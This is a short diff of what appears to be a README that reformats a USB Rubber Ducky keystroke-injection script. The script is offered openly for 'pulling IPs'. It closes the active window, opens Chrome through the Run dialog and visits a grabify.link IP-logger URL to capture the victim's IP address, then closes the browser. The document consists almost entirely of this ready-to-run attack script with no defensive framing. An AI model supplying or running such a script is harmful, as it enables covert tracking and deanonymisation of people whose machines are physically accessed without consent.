@@ -4,22 +4,22 @@ USB rubber ducky script to pull IPs
 Pull IPs with this simple Ducky script
 
 
-`REM Author: Cyber Coding
-REM Ducky for getting IPs 
-REM Only works if the user has chrome
-Delay 5000
-REM ----------- opens chrome web browser
-ALT f4
-Delay 3000
-GUI r
-DELAY 500
-STRING chrome
-DELAY 600
-ENTER
-DELAY 3000
-REM ----------- gets IPS
-STRING https://grabify.link/3K27ZM
-DELAY 3000
-ENTER
-DELAY 2000
-ALT f4`
+`REM Author: Cyber Coding`<br>
+`REM Ducky for getting IPs `
+<br>`REM Only works if the user has chrome`
+<br>`Delay 5000`
+<br>`REM ----------- opens chrome web browser`
+<br>`ALT f4`
+<br>`Delay 3000`
+<br>`GUI r`
+<br>`DELAY 500`
+<br>`STRING chrome`
+<br>`DELAY 600`
+<br>`ENTER`
+<br>`DELAY 3000`
+<br>`REM ----------- gets IPS`
+<br>`STRING https://grabify.link/3K27ZM`
+<br>`DELAY 3000`
+<br>`ENTER`
+<br>`DELAY 2000`
+<br>`ALT f4`
